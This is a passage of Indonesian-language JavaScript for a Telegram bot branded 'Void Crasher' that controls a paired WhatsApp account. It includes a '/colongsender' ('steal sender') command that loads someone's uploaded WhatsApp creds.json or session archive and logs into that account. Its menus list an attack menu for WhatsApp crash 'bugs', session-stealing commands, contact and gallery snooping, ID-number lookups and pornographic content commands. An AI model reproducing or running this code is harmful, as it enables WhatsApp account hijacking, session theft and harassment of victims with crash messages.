⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠠⣷⣿⣗⡤⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠛⢤⡀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣷⡀⠈⣿⣿⣄⠀⣿⣿⣿⠁⠹⣿⣿⣿⣿⣿⢿⣿⣗⠀⠀⠀⠉⠂⣠⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⣀⡼⠁⠀⠀
⠀⠀⠀⠀⠙⢶⡀⠀⠀⠀⠀⢿⣷⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⠏⠉⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⢿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⡿⣾⢻⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⠙⠳⢤⣀⣀⣀⣠⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⠇⣿⣿⣿⣿⢳⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⠹⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣟⣿⣿⣿⣿⣻⣿⣾⣿⣿⢸⣿⣿⣿⣿⡇⣿⣿⣿⢹⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⣅⡿⣫⠟⣿⣿⡿⢹⡿⠿⣿⣿⣧⢸⣿⣿⣿⣿⠇⣿⣿⠇⡞⣿⡏⠉⢷⠴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡿⠿⠟⠁⠀⡇⢸⡇⢀⣧⡤⢰⣿⡟⢸⡇⡏⢹⣿⠀⣿⡟⠀⢳⣿⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠞⠁⠀⠀⡠⠀⠀⠁⣿⠃⢸⣿⠙⢺⣻⡗⠸⡇⠡⢸⣿⣰⠈⠀⠀⢘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⢸⠁⠀⠀⠀⣿⠀⠘⣿⡄⠀⠁⠁⠀⠃⠀⠈⣿⠿⠀⠀⠀⠘⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠙⡇⠀⠀⠀⠀⠀⠀⢀⣏⣥⠀⠀⠀⢠⣤⠔⠀⠦⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⠀⠀⠀⠀⠀⠀
`));
console.log(chalk.bold.red(`
╭─❖──────────────────────────❖─╮
│ Developer : @Razzxyubot
│ Version : 2.2
│ Status : Sender connected 
├───────────────────────────────
│⟢ maaf bila script ini kurang sempura
│  gw bakal update trus ni script, makasi
╰─❖──────────────────────────❖─╯
  `));
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

let adminUsers = new Set([ownerID.toString()]);
function isAdminUser(userId) {
    return adminUsers.has(userId.toString());
}

function checkAdmin(ctx, next) {
    if (!isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk admin");
    }
    next();
}

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("blockcmd", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ ☇ Akses hanya untuk owner");

  const cmd = ctx.message.text.split(" ")[1];
  if (!cmd) return ctx.reply("⚠️ ☇ Contoh : /blockcmd attack");

  if (disabledCmd.includes(cmd)) {
    return ctx.reply(`⚠️ ☇ Command : /${cmd} sudah dinonaktifkan`);
  }

  disabledCmd.push(cmd);
  saveCmd(disabledCmd);

  ctx.reply(`✅ ☇ Command /${cmd} berhasil di blokir\n`);
});

bot.command("bukacmd", (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Akses hanya untuk owner");
  }

  const cmd = ctx.message.text.split(" ")[1];
  if (!cmd) {
    return ctx.reply("⚠️ Contoh: /bukacmd attack");
  }

  if (!disabledCmd.includes(cmd)) {
    return ctx.reply(`⚠️ Command /${cmd} tidak sedang diblokir`);
  }

  disabledCmd = disabledCmd.filter(c => c !== cmd);
  saveCmd(disabledCmd);

  ctx.reply(`✅ Command /${cmd} berhasil diaktifkan kembali`);
});

bot.command("listcmd", (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ Akses hanya untuk owner");
  }

  if (disabledCmd.length === 0) {
    return ctx.reply("✅ Tidak ada command yang diblokir.");
  }

  const list = disabledCmd.map(c => `• /${c}`).join("\n");

  ctx.reply(
    `📋 *Daftar Command yang Diblokir*\n\n${list}`,
    { parse_mode: "Markdown" }
  );
});

bot.command('addadmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /addadmin\n2. /addadmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    adminUsers.add(userId);
    
    await ctx.reply(
        `👑 <b>Admin Berhasil Ditambahkan</b>\n• User: <code>${userId}</code>`,
        { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id }
    );
    
    try {
        await ctx.telegram.sendMessage(
            userId,
            `🎖️ <b>Anda sekarang Admin FAULET XBLAUD!</b>\nAkses: Semua command bot kecuali manage admin`,
            { parse_mode: "HTML" }
        );
    } catch (error) {}
});

bot.command('deladmin', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } else if (args.length >= 2) {
        userId = args[1];
    } else {
        return ctx.reply("🪧 ☇ Cara:\n1. Reply pesan target + /deladmin\n2. /deladmin <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID tidak valid");
    }
    
    if (userId === ownerID.toString()) {
        return ctx.reply("❌ ☇ Tidak bisa hapus owner");
    }
    
    const wasAdmin = adminUsers.delete(userId);
    
    if (wasAdmin) {
        await ctx.reply(`🗑️ <b>Admin Berhasil Dihapus</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    } else {
        await ctx.reply(`❌ <b>User bukan admin</b>\n• User: <code>${userId}</code>`,
            { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
    }
});

bot.command('listadmin', checkAdmin, async (ctx) => {
    let adminList = "👥 <b>Daftar Admin</b>\n\n";
    let counter = 1;
    
    adminUsers.forEach(userId => {
        adminList += `${counter}. <code>${userId}</code> ${userId === ownerID.toString() ? '👑' : '👨‍💼'}\n`;
        counter++;
    });
    
    adminList += `\nTotal: ${adminUsers.size} admin`;
    await ctx.reply(adminList, { parse_mode: "HTML", reply_to_message_id: ctx.message.message_id });
});

function getPremiumUsers() {
    const premiumPath = path.join(__dirname, 'database', 'premium.json');
    
    try {
        if (fs.existsSync(premiumPath)) {
            const data = JSON.parse(fs.readFileSync(premiumPath, 'utf8'));
            
            if (typeof data === 'object' && !Array.isArray(data)) {
                return Object.entries(data).map(([userId, expiryDate]) => ({
                    userId,
                    expiryDate
                }));
            }
            
            else if (Array.isArray(data)) {
                return data;
            }
        } else {
            console.log("File premium.json tidak ditemukan di", premiumPath);
        }
    } catch (error) {
        console.error("Error membaca premium.json:", error);
    }
    return [];
}

bot.command('listprem', checkAdmin, async (ctx) => {
    const premiumUsers = getPremiumUsers();
    
    if (!premiumUsers || premiumUsers.length === 0) {
        return ctx.reply("📭 Tidak ada user premium");
    }
    
    let premList = "🌟 <b>Daftar User Premium</b>\n\n";
    
    premiumUsers.forEach((user, index) => {
        const userId = user.userId || user.id || "N/A";
        const expiry = user.expiryDate || user.expiry || "Unknown";
        
        // Cek apakah expired
        let status = "✅ Active";
        try {
            const expiryDate = new Date(expiry);
            if (new Date() > expiryDate) {
                status = "❌ Expired";
            }
        } catch (e) {}
        
        premList += `${index + 1}. <code>${userId}</code>\n`;
        premList += `   • Berakhir: ${expiry}\n`;
        premList += `   • Status: ${status}\n\n`;
    });
    
    premList += `Total: ${premiumUsers.length} user premium`;
    
    await ctx.reply(premList, { 
        parse_mode: "HTML",
        reply_to_message_id: ctx.message.message_id 
    });
});

bot.command('addprem', async (ctx) => {
    // CEK APAKAH OWNER ATAU ADMIN
    if (ctx.from.id != ownerID && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner / admin atau admin");
    }
    
    const args = ctx.message.text.split(" ");
    const replyTarget = ctx.message.reply_to_message;
    
    let userId = '';
    
    if (replyTarget && replyTarget.from) {
        userId = replyTarget.from.id.toString();
    } 
    else if (args.length >= 2) {
        userId = args[1];
    } 
    else {
        return ctx.reply("🪧 ☇ Cara penggunaan:\n1. Reply pesan target dan ketik /addprem\n2. /addprem <user_id>");
    }
    
    if (!userId || isNaN(userId)) {
        return ctx.reply("❌ ☇ ID user tidak valid");
    }
    
    const keyboard = {
        inline_keyboard: [
            [
                { text: "⌜📅⌟ 1 Bulan (30 Hari)", callback_data: `addprem_${userId}_30` }
            ],
            [
                { text: "⌜⚡⌟ Permanen (100 Hari)", callback_data: `addprem_${userId}_100` }
            ]
        ]
    };
    
    await ctx.reply(
        `👑 <b>Tambah Premium</b>\n` +
        `• User: <code>${userId}</code>\n` +
        `• Pilih durasi di bawah:`,
        {
            parse_mode: "HTML",
            reply_to_message_id: ctx.message.message_id,
            reply_markup: keyboard
        }
    );
});

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "RAZZXY99");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`javascript
⬡═―—⊱ ⎧ νσι∂ ¢яαѕнєя ⎭ ⊰―—═⬡
𖤓 Number: ${phoneNumber}
𖤓 Pairing Code: ${formattedCode}
𖤓 Status: Not Connected
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `
<blockquote><b> ⬡═―—⊱ ⎧ νσι∂ ¢яαѕнєя ⎭ ⊰―—═⬡ 
𖤓 Number: ${lastPairingMessage.phoneNumber}
𖤓 Pairing Code: ${lastPairingMessage.pairingCode}
𖤓 Status: Connected
</b></blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("killbot", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

// ============ CLAIM PREMIUM DARI GROUP ============
// ============ CLAIM PREMIUM (LANGSUNG JADI) ============
bot.command("claim", async (ctx) => {
  const userId = ctx.from.id;
  const duration = 30; // 30 HARI
  
  // CEK APAKAH USER SUDAH PREMIUM
  if (isPremiumUser(userId)) {
    return ctx.reply("✅ Anda sudah menjadi premium user!");
  }
  
  // TAMBAHKAN PREMIUM
  const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
  const premiumUsers = loadPremiumUsers();
  premiumUsers[userId] = expiryDate;
  savePremiumUsers(premiumUsers);
  
  ctx.reply(`✅ Selamat! Anda sekarang premium selama ${duration} hari!\n📅 Expired: ${expiryDate}\n\nSilakan gunakan fitur bot.`);
});

bot.command('colongsender', async (ctx) => {
  const msg = ctx.message;
  const chatId = msg.chat.id;
  
  if (!isOwner(msg)) return ctx.reply('❌ Khusus owner we.');

  const doc = msg.reply_to_message?.document;
  if (!doc) return ctx.reply('❌ Balas file session atau creds.json + dengan /colongsender');

  const name = doc.file_name.toLowerCase();
  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
    return ctx.reply('❌ File bukan session tolol.');

  await ctx.reply('🔄 Proses colong sender in you session…');

  const url = await bot.getFileLink(doc.file_id);
  const { data } = await axios.get(url, { responseType: 'arraybuffer' });
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

  if (name.endsWith('.json')) {
    await fs.writeFile(path.join(tmp, 'creds.json'), data);
  } else if (name.endsWith('.zip')) {
    new AdmZip(data).extractAllTo(tmp, true);
  } else {
    const tmpTar = path.join(tmp, name);
    await fs.writeFile(tmpTar, data);
    await tar.x({ file: tmpTar, cwd: tmp });
  }

  const credsPath = await findCredsFile(tmp);
  if (!credsPath) return ctx.reply('❌ creds.json tidak ditemukan bego');

  const creds = await fs.readJson(credsPath);
  const botNumber = creds.me.id.split(':')[0];

  await fs.remove(destDir);
  await fs.copy(tmp, destDir);
  saveActiveSessions(botNumber);

  const auth = await useMultiFileAuthState(destDir);
  await connectToWhatsApp(botNumber, chatId, auth);

  return ctx.reply(`*SUCCES CONNECTING🫀*
  NUMBER : ${botNumber}
  *ANJAYYY KEMALING🗿*`);
});

bot.command('delprem', async (ctx) => {
    // CEK APAKAH OWNER ATAU ADMIN
    if (ctx.from.id != ownerID && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.start(async (ctx) => {
  try {
    await ctx.telegram.setMessageReaction(
      ctx.chat.id,
      ctx.message.message_id,
      [{ type: "emoji", emoji: "👾" }],
      false
    );

    const username = ctx.from?.username ? `@${ctx.from.username}` : "Tidak ada username";
    const runtimeStatus = formatRuntime();
    const isPrivate = ctx.chat?.type === 'private';
    const CONFETTI_ID = "5104841245755180586";

    const menuMessage = `\`\`\`javascript 
  ⌜ νσι∂ ¢яαѕнєя ⌟ 

╭─【 νσι∂ ¢яαѕнєя 】─╮
   Halo Bang ${username}  
   Selamat menggunakan 
   "νσι∂ ¢яαѕнєя"  
   Gunakan dengan bijak ya 
╰───────────────────────╯

⋆ information ⋆
• Owner   : @Razzxyubot
• Version : 2.2
• Runtime : ${runtimeStatus}
ᝰ.ᐟ Always read the info provided  
ᝰ.ᐟ Tap one of the buttons below to start
© νσι∂ ¢яαѕнєя\`\`\``;

    
  const keyboard = [
  [
      { text: "ᴛᴏᴏʟꜱ ᴍᴇɴᴜ", callback_data: "/controls", style: "Danger"},
      { text: "ᴀᴛᴛᴀᴄᴋ ᴍᴇɴᴜ", callback_data: "/bug", style: "Success"}
  ],
  [
      { text: "ᴄᴏɴᴛʀᴏʟꜱ ᴍᴇɴᴜ", callback_data: "/owner", style: "Danger"},
      { text: "ᴛʜᴀɴᴋꜱ ᴛᴏ", callback_data: "/tqto", style: "Success"}
  ],
  [
      { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/Razzxyubot", style: "Primary"},
      { text: "ɪɴꜰᴏ ꜱᴄʀɪᴘᴛ", url: "https://t.me/VoidCrasherTeam", style: "Primary"}
  ]
];

    await ctx.replyWithPhoto(StartUrl, {
      caption: menuMessage,
      message_effect_id: isPrivate ? CONFETTI_ID : null,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: keyboard }
    });

    console.log("Bot Jalan");
  } catch (error) {
    console.error("Gagal:", error);
  }
});


bot.action('/start', async (ctx) => {
    try {
    
        const senderStatus = isWhatsAppConnected ? "Yes" : "No";
        const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
        const runtimeStatus = formatRuntime();
        const isPrivate = ctx.chat?.type === 'private';
        const CONFETTI_ID = "5104841245755180586";
        const memoryStatus = formatMemory();
        const cooldownStatus = loadCooldown();
        const username = ctx.from?.username ? `@${ctx.from.username}` : "Tidak ada username";
        let message_effect_id;

if (ctx.chat?.type === "private") {
  message_effect_id =
    menuEffects[Math.floor(Math.random() * menuEffects.length)];
}

        const menuMessage = `\`\`\`javascript 
  ⌜ νσι∂ ¢яαѕнєя ⌟ 

╭─【 νσι∂ ¢яαѕнєя 】─╮
   Halo Bang ${username}  
   Selamat menggunakan 
   "νσι∂ ¢яαѕнєя"  
   Gunakan dengan bijak ya
╰───────────────────────╯

⋆ information ⋆
• Owner   : @Razzxyubot
• Version : 2.2
• Runtime : ${runtimeStatus}
ᝰ.ᐟ Always read the info provided  
ᝰ.ᐟ Tap one of the buttons below to start
© νσι∂ ¢яαѕнєя\`\`\``;

    
  const keyboard = [
  [
      { text: "ᴛᴏᴏʟꜱ ᴍᴇɴᴜ", callback_data: "/controls", style: "Danger"},
      { text: "ᴀᴛᴛᴀᴄᴋ ᴍᴇɴᴜ", callback_data: "/bug", style: "Success"}
  ],
  [
      { text: "ᴄᴏɴᴛʀᴏʟꜱ ᴍᴇɴᴜ", callback_data: "/owner", style: "Danger"},
      { text: "ᴛʜᴀɴᴋꜱ ᴛᴏ", callback_data: "/tqto", style: "Success"}
  ],
  [
      { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/Razzxyubot", style: "Primary"},
      { text: "ɪɴꜰᴏ ꜱᴄʀɪᴘᴛ", url: "https://t.me/VoidCrasherTeam", style: "Primary"}
  ]
];

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: StartUrl,
        message_effect_id: isPrivate ? CONFETTI_ID : null,
        caption: menuMessage,
        parse_mode: "Markdown"
      },
      {
        reply_markup: { inline_keyboard: keyboard }
      }
    );
  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Anjay Error.");
  }
});

bot.action('/controls', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5104841245755180586";
    const controlsMenu = `
<blockquote><b>〘 𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨 〙</b></blockquote>
<blockquote><b>〣 /mediafire - convert MediaFire 
〣 /trackip - IP Information
〣 /tiktok - Tiktok Downloader
〣 /igdl - Instagram Downloader
〣 /nikparse - Nik Infomation
〣 /csessions - Colong Session#1
〣 /getsender - Colong Session#2
〣 /convert - To Url Media
〣 /brat - Quotes Sticker
〣 /yt - YouTube Search
〣 /gethtml - Get Code HTML
〣 /cekefek - Checking Effect Function
〣 /sendbokep - bkp random
〣 /tesfunc - test func
╘═—————————————–——═⬡</b></blockquote>
`;

    const keyboard = [
        [
            {
                text: "ʙᴀᴄᴋ",
                callback_data: "/start",
                style: "Danger"
            },
            {
                text: "ᴛᴏᴏʟꜱ ᴍᴇɴᴜ ᴠ2", callback_data: "/toolss", style: "Success"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: toolsUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: controlsMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/toolss', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5046509860389126442";
    const toolssMenu = `
<blockquote><b>〘 𝗧𝗢𝗢𝗟𝗦 𝗩𝟮 〙</b></blockquote>
<blockquote><b>〣 /deploy - Convert Web To Apps
〣 /remove - Fitur Bokep Ini Ajg
〣 /cekbio - Cek Bio Wa
〣 /cekbiotele - Cek Bio Telegram
〣 /anime - Searching Anime
〣 /waifu - Get Waifu Anime
〣 /nsfwwaifu - Waifu Ver Bokep
〣 /iqc - Screen WA Iphone
〣 /getnsfw - Bokep Anime#2
〣 /cekfile - Cek Nokos Via File
〣 /cekgaleri - Cek Galeri WA
〣 /cekkontak - Cek Kontak
〣 /toblur - blur foto
〣 /info - your id
〣 /videy - Bokep Lagi Ni memek
〣 /cekfunc - cek eror func
〣 /openfile - buka file
╘═—————————————–——═⬡</b></blockquote>

`;

    const keyboard = [
        [
            {
                text: "ʙᴀᴄᴋ",
                callback_data: "/start",
                style: "Danger"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: toolsUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: toolssMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/owner', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5046509860389126442";
    const bugMenu = `<blockquote><b>〘 𝗖𝗢𝗡𝗧𝗥𝗢𝗟𝗦 𝗠𝗘𝗡𝗨 〙</b></blockquote>
<blockquote><b>𖤓 /addbot - Add Sender
𖤓 /setcd - Set Cooldown
